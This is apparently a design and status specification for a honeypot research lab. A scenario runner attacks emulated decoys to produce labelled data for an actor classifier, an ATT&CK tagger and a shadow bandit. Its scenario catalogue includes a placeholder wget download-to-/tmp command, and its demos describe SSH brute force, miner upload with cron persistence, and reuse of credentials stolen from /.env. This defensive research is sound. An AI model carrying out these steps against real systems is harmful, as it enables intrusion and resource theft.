# Phase 2 specification · Lab, labels and first models

Status: in progress · 12 November 2026. Section 12 records what is built and what was measured.
Parent: [build plan, phase 2](01-build-plan.md#phase-2--lab-labels-and-first-models-weeks-610) · Companion docs: [architecture](02-architecture.md) · [AI/ML design](03-ai-ml-design.md) · [phase 1 spec](04-phase-1-spec.md)

Phase 2 closes the loop. A scenario runner attacks the decoys on an isolated lab network and records what it did. A join turns that record into labels on the captured events. Two first models are trained on the labels (an actor classifier and an ATT&CK tagger), and a bandit learns in shadow. Gate 2 (section 6) is the only exit criterion.

Three parts of this phase can go wrong without any test failing, because the result is a number that only looks better than it should:

- **The label join.** A step matched to the wrong event gives a wrong label that nothing downstream can detect.
- **The held-out split.** If test commands resemble training commands, every metric measures memory.
- **The bandit's logged probabilities.** If they are not the true probabilities, every later policy comparison is wrong.

Sections 3 and 5 exist to make those three failures loud.

## 1. Decisions this spec makes

Each is a default; say so if you disagree.

| # | Gap | Decision |
| --- | --- | --- |
| Q1 | From the host, every lab session arrives from one address (Docker's gateway). The sessioniser would link them all into one actor, and no session could be matched to its scenario by source. | A lab network and a second edge (section 2). The runner chooses a simulated source address and port for every connection and sends them in a PROXY v2 header. Each simulated actor gets its own address from 198.18.0.0/15, a range reserved for testing that is never routed on the internet. |
| Q2 | "Joins by scenario, source and time window" is ambiguous when sessions overlap | The runner knows the source address **and port** of every connection it opens, and the decoys log both. The join is exact on the connection, then on the step's time window inside it, and it verifies the captured input against what the runner sent (section 3). A step that does not match exactly one input is reported, never guessed. |
| Q3 | A `procedure_id` is a name we assign. Two procedures with different names can be the same command template, and then a split by procedure leaks. | The split is by procedure **and** checked by content: after masking variable parts, no held-out command may equal, or nearly equal, a training command (section 5). |
| Q4 | The tagger's retrieval index is built from procedure text. If it contains held-out procedures, retrieval finds the answer by lookup. | The index is built from the training split only. The build refuses held-out procedure IDs, and the content check in Q3 covers index entries. |
| Q5 | In phase 2 the tagger is rules and retrieval, not a trained model. The leak is the author: rules written after reading the test set. | The held-out scenarios are frozen before rule writing starts and are read only by the harness, which reports aggregates. A third of them come from Atomic Red Team, whose technique labels were assigned by other people. |
| Q6 | The rules always answer `allow` with probability 1. Data logged that way cannot evaluate any policy that does something else: there is nothing to reweight. | In the lab, and only there, an exploring policy acts: with probability ε it picks uniformly among the allowed actions, and it logs the exact probability of what it did. On all other traffic the rules decide and the bandit only shadows. Lab runs are split in two address ranges, capture (no exploration; used for labels and demos) and explore (used for the bandit). |
| Q7 | A scripted attacker that ignores the decoy's answers earns the same reward under every policy, so the bandit would have nothing to learn | Scenario steps can react: each may check the output and retry another way, skip, or leave (section 3). The reward then depends on the response. It still measures our attacker model, not real attackers; section 8 says so. |
| Q8 | The human class has no real data; a "human-paced" timing profile is our own generator, and a classifier would learn to recognise the generator | A recorder (`make lab-human`) lets a person type a session into the decoy through the lab edge. Real recordings are used for testing only. Until at least 20 exist, the human metric is reported as synthetic. |
| Q9 | Most real bot traffic uses SSH exec requests (`ssh host 'cmd'`), and a phase 1 note said Cowrie closes the whole connection when an exec channel closes | Checked first, and the note was wrong: exec requests work in every form tried (section 12), so no patch is needed. In the seed sample 676 of 786 logged-in sessions sent exactly one input, the pattern exec one-liners produce. The runner has an exec driver beside the shell one. |
| Q10 | The technical report's demos use parts that arrive later (LLM responder, analyst, TAXII feed, AWS, GNN) | Demos 1 and 2 are redefined for what phases 0 to 2 contain (section 4, 2.8). |
| Q11 | `plant_token` was due to join the action set in phase 2 | Deferred to phase 3. Planting a file mid-session means changing session state from the gate, which is what the phase 3 state manager is for. Phase 2 keeps the five actions the decoys already implement. |
| Q12 | The bandit's context includes the last tactic seen, but the policy service must answer in a few milliseconds and has no network route to the tagger | The policy service computes its own context from the requests it sees, using the tagger's compiled regex rules in-process. It calls nothing. |
| Q13 | LogPrécis has seven labels and no Credential Access, Command and Control or Collection | It is the measured baseline and the fallback when rules abstain, not the only tactic source. A technique found by rule or retrieval implies its tactic. |
| Q14 | ATT&CK is at v20.1 (5 November 2026); the code comments discuss v19 | Everything new is labelled against v20.1, pinned by file hash. LogPrécis predates the v19 split of Defense Evasion, so its label is compared at the merged level (Stealth and Defense Impairment together). |
| Q15 | The classifier's inputs are timings, so CI cannot shorten the runs that produce its data | CI checks the models against a frozen, committed lab dataset. Only the demos run live in CI; they use the bot profile, which has no long pauses. |
| Q16 | Lab data would carry the deployment's honeytokens into the repository | The frozen dataset is generated from a fixed lab-only profile seed. No deployment secret enters it. |

## 2. Lab topology

```
 runner (mirage_lab only) ──PROXY v2 with a simulated source──► lab-edge (HAProxy, accept-proxy)
                                                                   │  mirage_decoy (internal)
                                                                   └──► the four decoys, unchanged
 runner writes ground truth as JSON lines to its own volume
        ▼
 Vector ──► NATS sim.groundtruth ──► label join ──► ClickHouse
```

- **Networks.** `mirage_lab` is `internal: true` and holds only the runner and `lab-edge`. `lab-edge` is also on `mirage_decoy`, like the real edge. The runner has no route to the decoys, the gate, the pipeline or the internet.
- **Compose profile.** `runner`, `lab-edge` and `mirage_lab` exist only under the compose profile `lab`. They are never started on an exposed sensor: `lab-edge` trusts the source address it is told, which is safe only where the runner is the sole client. A containment test asserts that without the profile no container accepts a PROXY header from anything but the real edge.
- **Target check.** The runner resolves its one target, `lab-edge`, and refuses to start unless that address is inside the `mirage_lab` subnet. It has no option to name another target. This is the build plan's safety rule, and it is unit-tested.
- **Addresses.** Capture runs use 198.18.0.0/16, explore runs 198.19.0.0/16. Addresses are handed out in order from a counter on the runner's volume and not reused, so phase 1's per-source decoy state starts clean for every simulated actor.
- **Clients.** A small relay inside the runner adds the PROXY header, so ordinary clients (paramiko, httpx, PyMySQL, raw sockets) are used unchanged. Each simulated actor also gets its own SSH client version string and algorithm order, so the sessioniser's fingerprint link does not merge unrelated lab actors.
- **Ground truth path.** The runner publishes nothing over the network. It writes JSON lines, one file per run (`groundtruth.json.<run_id>`, pruned after 14 days); Vector tails them to the `sim.groundtruth` subject (the `SIM` stream already exists).

## 3. Scenarios, ground truth and the join

**Scenario file.** YAML, one file per scenario, validated by a pydantic model.

```yaml
# lab/catalogue/*.yaml: the only place a procedure's text exists
procedures:
  - {id: sysinfo-uname-all, technique: T1082, tactic: TA0007, source: own, protocol: ssh,
     template: "uname -a"}
  - {id: fetch-http-wget, technique: T1105, tactic: TA0011, source: own, protocol: ssh,
     template: "wget http://{{host}}/{{file}} -O /tmp/{{file}}"}
  - {id: transfer-sftp-put, technique: T1105, tactic: TA0011, source: own, protocol: ssh,
     kind: upload, template: "/tmp/{{file}}"}
  - {id: change-dir, source: own, protocol: ssh, template: "cd {{dir}}"}   # no technique

# lab/scenarios/**.yaml
id: recon-then-fetch-03
actor: {class: scripted_bot, timing: bot-fast, patience: 2}
sessions:
  - protocol: ssh
    channel: exec                          # or shell
    login: {user: root, guesses: 6, procedure: ssh-password-guessing}
    steps:
      - {id: s1, procedure: sysinfo-uname-all, expect: "Linux", on_fail: leave}
      - {id: s2, procedure: fetch-http-wget, expect_status: 0, on_fail: {goto: s4}}
      - {id: s3, procedure: change-dir}
      - {id: s4, procedure: transfer-sftp-put}
```

- **Procedures** live in a catalogue (`lab/catalogue/*.yaml`): ID, technique, tactic, source (`own`, `atomic`, `corpus`), kind (`input`, `upload`, `auth`) and the input template. A scenario step only names a procedure, so a procedure's text exists in one place and the content check of section 5 has one thing to compare. A procedure with no technique is an explicit negative, not a gap.
- **Slots** (`{{host}}`, `{{file}}`, …) are filled per run from generators seeded by the run: hosts from the documentation ranges and `.example` names, random file names, random bytes for uploads. No real malware, wallet, pool or C2 address appears anywhere.
- **Reactions.** `expect` and `expect_status` decide whether a step succeeded. `on_fail` is one of `continue`, `retry`, `goto`, `leave`. The actor profile adds patience: how many failures it tolerates before leaving.
- **Timing profiles.** `scan` (connect, at most a banner or a login attempt), `bot-fast` and `bot-slow` (whole lines, near-constant gaps), `human` (keystrokes sent one at a time with drawn gaps, occasional typos and corrections, pauses to read output scaled by its length).
- **Lint, run before anything is sent.** Inputs must not contain a technique ID, a procedure or scenario ID, or a marker word (`mirage`, `atomic`, `scenario`, `selftest`, `honeypot`, `cowrie`, `gate1`). The same check runs again on every rendered input at send time. A scenario may only use procedures from one split (section 5).

**Ground-truth records** (schema 0.3.0, `schema/src/mirage_schema/groundtruth.py`). A step record gains `run_id`, `session_ref`, `evidence` (what the join should find: a typed `input`, an `upload`, `auth` attempts, or the `connect` itself), `input_sha256` (of the text, or of the uploaded bytes) and `outcome` (what the reaction logic concluded). A session record carries what is true of a whole session: the connections it used (source address and port, destination port, open and close times), `actor_ref`, `actor_class`, `timing_profile`, `real` (true for recorded humans), and `mode` (capture or explore). A run record closes each run with the hashes of the catalogue and scenarios, the seed and the code version.

**The join** (`pipeline/src/mirage_pipeline/simjoin.py`, the service `sim-join`; it lives with the pipeline because it reads NATS and writes ClickHouse, which the runner must never reach). It stores every record in `mirage.sim_truth` and joins a run once its run record has arrived and its sessions have closed, or after two minutes with whatever has arrived. All of its state is in ClickHouse, so `mirage-sim-join --run ID` repeats a join exactly.

1. A `SessionTruth` connection matches exactly one captured connect event on source address, source port and destination port. That gives the decoy's session ID.
2. Within that session, a step matches the inputs whose timestamps fall inside the step's window, widened by 250 ms.
3. The match is accepted only if the captured input's hash equals `input_sha256`. For SSH the comparison is on the whole line as Cowrie received it, so a human profile's typos and corrections do not matter. One line can produce several gated inputs (a pipeline, a loop); the line's label is attached to all of them.
4. Results go to `mirage.sim_labels` (per event), `mirage.sim_steps` (per step, with its state), `mirage.sim_sessions` (per decoy session) and `mirage.sim_runs` (per run, with the health counts). The view `mirage.events_labelled` joins labels to events; events themselves are not rewritten. Rows of one join share a version, and the views read only each run's latest, so a repeated join replaces its result.

Every step ends in exactly one state: `matched`, `no_event` (the step ran, nothing was captured), `mismatch` (something was captured in the window, but not that input), or `not_run` (failed or skipped by the runner). Inputs with no step (a client library's own start-up queries, for example) are `unlabelled`, which is not the same as a negative label, and they are excluded from training.

**Join health** is a number the gate checks: over capture runs, `no_event` and `mismatch` together must be zero. Either means the capture or the join is wrong, and no dataset is built from a run that has one.

## 4. Work packages

### 2.0 Prerequisites

- **Cowrie exec requests.** Checked; nothing to fix (Q9).
- **Keystroke statistics.** The artifact indexer already reads Cowrie's volume. It gains a TTY-log parser that writes `mirage.tty_stats` per session: input chunk count, the share of single-byte chunks, backspaces, gaps between keys (quantiles), and paste bursts. Nothing else distinguishes typing from pasting.
- **Workspace.** New packages `lab/` and `intel/`. Heavy libraries (LightGBM, Vowpal Wabbit, DuckDB, MLflow, torch) go in a dependency group `ml`, so the lint and unit job stays as fast as it is.

### 2.1 Scenario runner

`lab/` as section 3 describes: the scenario and catalogue models, lint, slot generators, the PROXY relay, protocol drivers (SSH shell, SSH exec, SFTP, HTTP, Redis, MySQL), timing profiles, reactions, ground-truth writer, and `make lab-run`. Sessions run concurrently, one simulated address each.

Content targets, counted in the catalogue, not promised by this spec: at least 160 procedures over at least 40 techniques, each technique with at least four procedures, from three sources in roughly equal parts.

| Source | What | Who assigned the label |
| --- | --- | --- |
| `own` | Scenarios written for this project, including the demos | Us |
| `atomic` | Atomic Red Team tests with `sh` or `bash` executors (MIT licence), typed into the decoy, not executed anywhere | Atomic Red Team |
| `corpus` | The most frequent command templates in the Zenodo seed sample | Us, from real traffic |

The decoys are emulators, so many commands answer "command not found". That is fine: the label belongs to the input, and the input is captured.

A step can **capture** a value from the response it just read (a regular expression with one group), and a later session's login can take its password from that capture (`password_from`). Demo 2 uses this: the attacker logs in to MySQL with the password it read from the web decoy's `/.env`, not with one handed to it by the profile. The captured value lives in the runner's memory only and never reaches a scenario file or the ground truth.

**Must not:** connect anywhere but `lab-edge`; send a real payload; run when the lint fails; run without the frozen split (`LAB_SPLIT`), which is what lets the lint refuse a scenario that mixes splits; reuse a simulated address within a run.

### 2.2 Label join and dataset

The join of section 3, plus `lab/dataset.py`, which exports from ClickHouse to Parquet and builds two tables:

- `steps`: one row per labelled input: protocol, the input text, its position and timing in the session, labels, `procedure_id`, source, split.
- `sessions`: one row per session: the features of 2.3, `actor_class`, `actor_ref`, `real`, split.

Each dataset has a manifest: the hashes of the catalogue, scenarios, profile seed, ATT&CK file and code version that produced it, and the row counts per split. `make lab-dataset` builds one; the frozen one for CI lives in `eval/datasets/` (Q15, Q16).

### 2.3 Actor classifier v0

- **Classes.** `scanner` (no authenticated activity: banner grabs, credential spraying, path sweeps), `scripted_bot` (automated activity after access), `human` (interactive). `llm_agent` stays in the label set and is not trained or scored until phase 4 provides lab agents.
- **Rules first.** A session that never held access is a `scanner`, with no model involved. Access is a login that succeeded, or input to a service that asks for none (the Redis decoy until a password is set). This is the class's own definition, and it was widened on 15 November 2026 from "no successful login and no input": the first experiment showed that a model which does not read content cannot tell a bot's request to a page it never logged in to from a scanner's, and the labels said otherwise ([experiment](experiments/phase-2/classifier.md)). The model's job is what is left: bot or person.
- **Features**, from an explicit allowlist:
  - Event-level, available for any Cowrie data: input count, gaps between inputs (median, spread, minimum), session length, failed logins before success, share of inputs the emulator knew, share of inputs first seen in this session against the corpus, exec or shell.
  - Keystroke-level, ours only: the `tty_stats` columns.
- **Never features:** source address or port, anything from `sim_*`, session or actor IDs, absolute time, credentials. A unit test fails if the feature frame contains a column outside the allowlist.
- **Model.** Two variants: event-level only (can be run on the Zenodo corpus) and full. The family is chosen by experiment and recorded in `eval/choices.yaml`; LightGBM was the plan, and a random forest won.
- **Reported.** Macro-F1 and the confusion matrix on held-out scenarios (section 5, item 6), against two baselines (rules only; majority class). Separately, agreement with heuristic labels on the Zenodo sample (no login or no command is a scanner; a session whose commands repeat exactly across many sources is a bot). The human row comes from real recordings when they exist (Q8).

### 2.4 Tagger v0

Three layers, each measured alone and together, so a layer that does not help is dropped. Measured on 15 November 2026 ([experiment](experiments/phase-2/tagger.md)): layer 2 stands alone for single inputs, with Atomic Red Team's Linux tests added to its index; the starter rules in front of it made it worse and LogPrécis alone is weaker at tactic level, so both are dropped as input-level layers. Session-level rules stay, and LogPrécis stays as the reported baseline.

1. **Technique rules** (`intel/rules/*.yaml`): regexes on a normalised input, per protocol, each naming a technique and a confidence. Session-level rules cover what no single input shows: many failed logins then a success is brute force. The same compiled rules serve the policy service (Q12).
2. **Retrieval.** Embed the normalised input and find the nearest entries among ATT&CK technique descriptions and training-split procedures. Answer the top technique if its score clears a threshold set on the dev split; otherwise abstain.
3. **LogPrécis** for SSH sessions, tactic level, when the first two abstain.

Labels go to `mirage.labels` (event or session, kind, value, confidence, `model_version`, `attack_version`, the evidence: rule ID or neighbour). Two workers write them. The pipeline's tagger worker consumes `events.normalised` like the sessioniser, writes session-rule labels and turns every label into alerts. The model worker (`mirage-tagger-model-worker`) reads gated inputs from the store and writes one label per input: an SSH line and the gated commands it expanded to are one input, labelled by its most confident command, which is how the model was scored.

**Reported.** Per step: micro- and macro-F1 at technique level (exact, and with sub-techniques folded into their parent) and the abstention rate. Per session: precision and recall of the tactic set. All of it by source (`own`, `atomic`, `corpus`), against two baselines (most frequent technique; LogPrécis alone at tactic level). Techniques with no training procedure are reported separately as unseen, not averaged in.

HTTP, Redis and MySQL get rules only in this phase.

### 2.5 Bandit responder (shadow)

- **Decision record.** Every decision the policy service logs gains: the context features, the allowed actions after the mask, the acting policy (name, version, action, its probability), and the shadow policy (name, version, its probability for every allowed action). The decoys' contract does not change.
- **Context** (Q12): protocol, verb class, whether the emulator knows the input, inputs so far, seconds since the last input, last tactic seen by rule, whether the input was seen before in this process.
- **Actions.** `allow`, `delay` (one fixed duration), `fake_success` (empty output), `fake_error` (a per-verb message from a small table), `terminate`. The mask removes `terminate` on the first input and anything a protocol cannot express.
- **Exploring policy** (Q6): active only when the service is started with `POLICY_EXPLORE=lab` **and** the source is in the explore range. Probability of each action is `(1 − ε)` for the rule's action plus `ε / n` for each of the `n` allowed actions, ε = 0.3. That number is what gets logged.
- **Reward** (`intel/reward.py`, versioned, computed offline from stored events): for each decision, over the rest of its session: +1 per new distinct technique, +2 per new captured artifact, +3 per honeytoken reached or used, −2 if the session ends before the next input after a non-`allow` action. Nothing is paid for time or for input count. Techniques come from the tagger's rules, so the reward can be computed on real traffic; in the lab it is also computed from ground truth, and the difference is reported.
- **Shadow policy.** Vowpal Wabbit (`--cb_explore_adf`), trained offline from the explore logs into a model file the policy service loads read-only. No online updates in this phase.
- **Off-policy estimators** (`intel/ope.py`): inverse propensity, self-normalised, doubly robust, with bootstrap intervals. Unit-tested on synthetic logs where the true value is known.
- **Must not:** explore outside the lab range under any setting; choose a masked action; make a network call from the policy service.

### 2.6 Evaluation harness

`eval/harness.py` and `make eval`:

- Runs the checks of section 5, then scores the classifier, the tagger layers and the shadow policy on the held-out split, with baselines and bootstrap intervals.
- Logs to MLflow (SQLite, local, on demand) and writes `eval/baselines/<dataset>.json`.
- **CI job `eval-regression`:** on the frozen dataset, re-runs everything that needs no large model (section 5 checks, classifier, rule tagger, estimators) and fails if a metric falls below its committed baseline by more than its interval. Retrieval and LogPrécis are scored locally, and CI checks that their committed numbers belong to the same dataset hash.

### 2.7 Dashboard v1

- **Alerts.** `mirage.alerts`, one row per session, written by the tagger worker when a session triggers a honeytoken, captures an artifact, or shows Persistence or Impact. The row lists the reasons, tactics, techniques, actor class and addresses.
- **Grafana.** Alerts page; tactic heatmap (tactic by day, and by actor class); tags and actor class on the Sessions and Session pages; a Lab page (runs, join health, split sizes, the latest metrics and their baselines); policy page additions (action mix, explore share, shadow agreement).

### 2.8 Demos 1 and 2

Both are scenarios in `lab/scenarios/demo/`, run live in CI, in capture mode.

| Demo | The simulated attacker | Asserted |
| --- | --- | --- |
| 1 · SSH brute force to miner | Guesses SSH passwords and gets in; looks around (`uname -a`, `w`, `crontab -l`); tries to download a miner and, when that fails for lack of egress, uploads it; runs it with pool arguments; adds a cron entry | Actor class `scripted_bot`. Tactics: Credential Access, Discovery, Command and Control, Execution, Persistence, Impact. The upload is an indexed artifact. One alert for the session. |
| 2 · Web credential theft and reuse | From one address, sweeps web paths and reads `/.env`, which holds the planted database credential. Later, from a second address, logs in to MySQL with it and reads the customer table. | First session: `scanner`, Reconnaissance and Credential Access. Second: `scripted_bot`, valid-account use and Collection. `token.triggered`; both sessions under one actor by the honeytoken link, with the second address recorded. One alert naming both. |

The "miner" is random bytes. Technique IDs for the assertions are fixed when the catalogue is loaded against ATT&CK v20.1.

### 2.9 First external sensor

Not part of this spec or of Gate 2. It waits for a Linux host and a named person who authorises exposure ([build plan section 7](01-build-plan.md#7-safety-and-exposure-checklist)).

## 5. What "held out" means

The split is assigned once, in `eval/split.yaml`, and everything downstream reads it.

1. **Unit.** Procedures are assigned to `train`, `dev` or `test`, about 60/20/20, stratified by technique and by source. `dev` is for thresholds and rule writing; `test` is read only by the harness.
2. **Scenarios do not mix splits.** A scenario uses procedures from one split only, so no session has training and test steps side by side.
3. **Content check.** Every input is normalised: addresses, hosts, hex strings, numbers and generated names become placeholders. No test input may equal a train or dev input after that, and any pair above 0.9 token similarity is listed and must be resolved (merged into one procedure, or one of them moved).
4. **Coverage.** A technique counts in the headline metric only if it has training procedures and test procedures. Others are reported as unseen.
5. **Index hygiene** (Q4). The retrieval index contains no dev or test procedure.
6. **The classifier holds out scenarios, not procedures** (changed 14 November 2026, after the first live run). The procedure split exists to stop a model memorising command text, which the classifier never reads; and its dev and test halves turned out to hold four scripted-bot scenarios each, with every scanner scenario and the one human-paced scenario in train. So the classifier is scored by holding out whole scenarios in rotation (five folds, dealt class by class), predicting every session once with a model that never saw its scenario. A scenario and its timing variants (`variant_of`) are held out together, so a human-paced twin is never tested against a model trained on its bot original. Intervals resample scenarios, not sessions. Real human recordings are predicted but never trained on. A session's class is taken at session level: one that never held access is scanner behaviour whoever made it, which is what the rule in 2.3 says.
7. **De-duplication.** Identical sessions (same normalised inputs in the same order) are collapsed before any metric is computed.
8. **No lab marker in the inputs.** A test confirms that a model given only the allowlisted inputs cannot see `sim` fields, addresses or IDs.

The harness refuses to report a metric if any of checks 2, 3, 5 or 8 fails.

**What these metrics do not show.** Lab scores are an upper bound. The scenario authors chose the procedures, the timing profiles are generators, and the reactive attacker is a model. Each report therefore carries the real-data sanity checks beside the lab numbers: classifier agreement with heuristics on the Zenodo sample, and tagger abstention and tactic mix on the same sample.

## 6. Gate 2

| # | Test | Asserts |
| --- | --- | --- |
| 1 | Runner safety | The target check refuses any address outside `mirage_lab`. The lint rejects an input with a technique ID or a marker word. Without the `lab` profile nothing but the real edge is accepted by the decoys. |
| 2 | Join health | Over the capture runs behind the frozen dataset, zero `no_event` and zero `mismatch`. Every connection matched exactly one session. |
| 3 | Demo 1, live in CI | The assertions of 2.8 |
| 4 | Demo 2, live in CI | The assertions of 2.8 |
| 5 | Split integrity | Section 5 checks 2, 3, 5 and 8 pass on the frozen dataset |
| 6 | Classifier | Reported on held-out scenarios (section 5, item 6) with both baselines and the Zenodo check; better than rules-only and than the majority class by more than its interval |
| 7 | Tagger | Reported on the held-out split by source, with both baselines; technique-level micro-F1 better than the most-frequent baseline by more than its interval |
| 8 | Bandit logging | At least 300 explore sessions and 3,000 decisions. Per context bucket, the observed action frequencies agree with the logged probabilities (chi-square). The mean importance weight of a uniform target policy is 1 within its interval. No masked action was taken. No exploration outside the lab range. |
| 9 | Off-policy estimators | On synthetic logs, each estimator recovers the known value within its interval. The shadow policy's estimated value is reported against the rules'; it does not have to win until Gate 3. |
| 10 | Regression job | `eval-regression` passes on the frozen dataset, and fails when a metric is deliberately lowered |
| 11 | Phase 1 still holds | Gate 1 passes with the lab profile running, including latency: the larger decision record must not push gating past 20 ms at p95 |

Tests 6 and 7 require a model to beat a trivial baseline, not to reach a number. A threshold chosen before any data exists would be a guess.

## 7. Order of work

| Step | Work | Why here |
| --- | --- | --- |
| 1 | 2.0 prerequisites; lab network, `lab-edge`, runner skeleton with the target check and one SSH scenario end to end | Everything else needs labelled sessions |
| 2 | Ground truth and the join (2.2), with join health visible | A wrong join poisons every later step, so it is proven on one scenario before content is written |
| 3 | Catalogue and scenarios (2.1 content); split file frozen; demo scenarios | The test split must exist before any rule is written (Q5) |
| 4 | Tagger rules, then retrieval, then LogPrécis (2.4); alerts (2.7) | Rules also feed the policy's context and the reward |
| 5 | Keystroke statistics in use; classifier (2.3); human recorder | Needs the session dataset |
| 6 | Decision record, exploring policy, reward, estimators, shadow policy (2.5) | Needs the rules (context) and the tagger (reward) |
| 7 | Harness, frozen dataset, CI jobs (2.6); dashboards (2.7); demos in CI (2.8); Gate 2 | |

## 8. Known limits

| Limit | Consequence |
| --- | --- |
| The simulated attacker's reactions are ours | The bandit learns how our scenarios respond. Phase 2 proves the logging, the reward and the estimators; whether a learned policy helps against real attackers is a phase 3 question that needs real traffic. |
| Timing profiles are generators | Classifier scores on synthetic humans show it can recover the generator. Only the real recordings and the Zenodo check say anything about real sessions. |
| One author for scenarios, rules and labels | Mitigated by freezing the test split first and by the Atomic Red Team share; not removed. |
| Emulated decoys answer many commands with "command not found" | Scenarios that depend on a command's real output cannot progress far. Depth comes with the phase 3 responder and sandbox. |
| LogPrécis was trained on 360 sessions with seven labels | Used as a baseline and fallback, with its own score reported |
| The Zenodo sample has no keystroke data and almost no humans | The corpus check uses the event-level model only and says little about the human class |

## 9. Out of scope

The external sensor (2.9); `plant_token` (Q11); any policy other than the rules acting on non-lab traffic; an LLM anywhere in the live path; the fine-tuned tagger (phase 3); Caldera (phase 3); campaign clustering beyond the existing actor links (phase 4); the LLM-agent class (phase 4); sending alerts anywhere outside Grafana.

## 10. Downloads and new dependencies

Nothing here is fetched until approved.

| Item | Size | Licence | Needed for |
| --- | --- | --- | --- |
| Python libraries in the `ml` group: LightGBM 4.7, Vowpal Wabbit 9.11, DuckDB 2.0, MLflow 3.18, torch, transformers, sentence-transformers | about 1 GB installed, mostly torch | Permissive (MIT, BSD, Apache-2.0) | 2.3 to 2.6 |
| LogPrécis weights (`SmartDataPolito/logprecis`) | 496 MB | Apache-2.0 | 2.4 layer 3 |
| A small sentence-embedding model | about 130 MB | To be confirmed at download; permissive only | 2.4 layer 2 |
| ATT&CK Enterprise v20.1 (STIX JSON) | about 50 MB | ATT&CK terms of use (free, attribution) | Catalogue checks, retrieval |
| Atomic Red Team, the `atomics` directory only | well under the 630 MB full repository | MIT | 2.1 content |

LightGBM, Vowpal Wabbit, DuckDB, MLflow and sentence-transformers have wheels for Python 3.12 on arm64 macOS and Linux (checked on PyPI, 12 November 2026); torch and transformers are still to check. The policy image gains Vowpal Wabbit only.

## 11. Decisions needed from you

| Decision | Default if you say nothing |
| --- | --- |
| Will you record about 20 typed SSH sessions (roughly an hour) for the human test set? | The recorder is built; the human metric is reported as synthetic until recordings exist |
| The downloads in section 10 | Asked again, item by item, when each is first needed |
| An offline LLM step that re-ranks retrieval candidates with the local Qwen model | Not in v0. Rules and retrieval are measured first; the re-ranker is added only if they leave a gap it could close. Attacker input never goes to a cloud model. |
| Deferring `plant_token` to phase 3 (Q11) | Deferred |
| The numbers in Gate 2 test 8 (300 sessions, 3,000 decisions) and ε = 0.3 | As written |

## 12. Implementation status (15 November 2026)

Phase 2 was first declared mostly done on 12 November, before any of it had run against a live stack. The first live run (14 November) found four defects, and an audit of the code against this spec found many more, most of one shape: something passed without measuring what the spec asks. [The completion plan](07-phase-2-completion.md) lists every gap and how each was closed. This section is the state after that work, and every number in it was measured on the lab host.

| Part | State | Where |
| --- | --- | --- |
| 2.0 exec requests | Checked, no patch needed: fourteen forms pass and each is gated. | |
| 2.0 keystroke statistics | Done. Cowrie's TTY logs are parsed into per-session counts (keys, single-key writes, corrections, paste bursts, key gaps). | `pipeline/src/mirage_pipeline/ttystats.py`, `mirage.tty_stats` |
| Lab network and `lab-edge` | Done. Tested by address, not by name: the runner reaches the lab edge and has no route to anything else; the real edge does not believe a client's PROXY header. | `compose/lab/haproxy.cfg`, `tests/integration/test_lab.py` |
| 2.1 runner | Done for all four protocols, with step capture, per-run ground-truth files, an address pool that refuses reuse, and a human recorder (`make lab-human`). | `lab/src/mirage_lab/` |
| 2.1 content | 205 procedures over 41 ATT&CK v20.1 techniques, written by a separate tool. 58 scenarios exercise every one of them: the hand-written ones, 8 human-paced twins and 16 generated coverage scenarios. Every technique ID is checked against the pinned v20.1 index. | `lab/catalogue/`, `lab/scenarios/`, `lab/src/mirage_lab/generate.py`, `eval/attack-index.json` |
| Ground truth and 2.2 join | Done. The join reports missing sessions and steps, invalid records and runs with no closing record, and requires the content event. | `pipeline/src/mirage_pipeline/simjoin.py` |
| 2.2 dataset export | Done: one row per logical session, a steps table, a decisions table. It refuses an unhealthy run and anything not rendered from the lab seed, and scans inputs for lab markers. | `intel/src/mirage_intel/dataset.py`, `decisions.py` |
| 2.3 actor classifier | Done. A rule (no access means scanner), then a random forest chosen by experiment, saved as plain JSON. A worker writes predictions to `mirage.actor_class` and recomputes them as a session grows. | `intel/src/mirage_intel/classifier.py`, `classify_worker.py`, [experiment](experiments/phase-2/classifier.md) |
| 2.4 tagger | Done. Retrieval over the training procedures and Atomic Red Team's Linux tests, chosen by experiment. A worker labels each gated input live. Session rules and alerts stay in the pipeline's tagger worker. The starter rules and LogPrécis were measured and dropped as input-level layers. | `intel/src/mirage_intel/tagmodels.py`, `tagserve.py`, `tag_worker.py`, [experiment](experiments/phase-2/tagger.md) |
| 2.5 bandit | Done to what Gate 2 asks. Reward-to-go as specified; estimators that resample sessions; three learners compared with the rules. No learner beat the rules, so the rules act and a linear model shadows, loaded read-only by the policy service through the same code that trained it. | `intel/src/mirage_intel/reward.py`, `ope.py`, `policylearn.py`, `schema/src/mirage_schema/bandit.py`, [experiment](experiments/phase-2/bandit.md) |
| 2.6 harness | Done. Runs the section 5 checks, scores the chosen models, decides the gates, exits non-zero on any failure, and compares with a committed baseline. The frozen dataset carries the tagger's index and embedding vectors, so the regression job needs no model. | `intel/src/mirage_intel/harness.py`, `eval/choices.yaml`, `eval/datasets/gate2/`, `eval/baselines/gate2.json` |
| 2.7 dashboards | Done. Session and Sessions pages show tags and predicted class; Alerts has actor alerts; Lab shows the harness's metrics and gates; Policy shows shadow agreement. Every panel's query is run against the live store by a test. | `tools/grafana_dashboards.py`, `tests/integration/test_dashboards.py` |
| 2.8 demos | Done, asserted on the system's own output: the tagger's labels, the classifier's predictions and the actor alert. | `lab/scenarios/demo/`, `tests/integration/test_lab.py` |
| Split file (section 5) | Frozen: 123/41/41 procedures, 39/9/10 scenarios. New scenarios are added without moving a procedure (`python -m eval.split extend`). | `eval/split.yaml` |

**The collection (15 November 2026, lab host, lab seed).** One capture run of every scenario six times and one explore run, after two small end-to-end passes. The frozen dataset `eval/datasets/gate2` is the capture run's sessions and steps and the explore run's decisions.

| | Capture `r20261114212942-973f72` | Explore `r20261114214550-b64a24` |
| --- | --- | --- |
| Sessions | 354 | 944 |
| Steps matched | 1,932 of 1,944 | 4,665 of 5,182 |
| `no_event` / `mismatch` | 0 / 0 | 3 / 8 |
| Not run (skipped by a reaction) | 12 | 506 |
| Connections matched | 486 of 486 | 1,294 of 1,294 |

The dataset holds 390 logical sessions (258 scripted bot, 78 scanner, 54 human, in 50 scenario groups), 1,704 steps and 5,181 logged decisions, of which 5,055 are usable and 126 were excluded because the decoy fell back to `allow`.

| Gate 2 test | Result |
| --- | --- |
| 1 Runner safety | **Pass.** Probed by address, the runner reaches the lab edge and has no route to any other service or to the internet; the lab network is internal and holds only the lab edge; a PROXY header sent through the real edge is not believed. |
| 2 Join health | **Pass.** The capture run above: every step that ran matched exactly, no `no_event`, no `mismatch`, every connection matched, no missing or invalid truth record. |
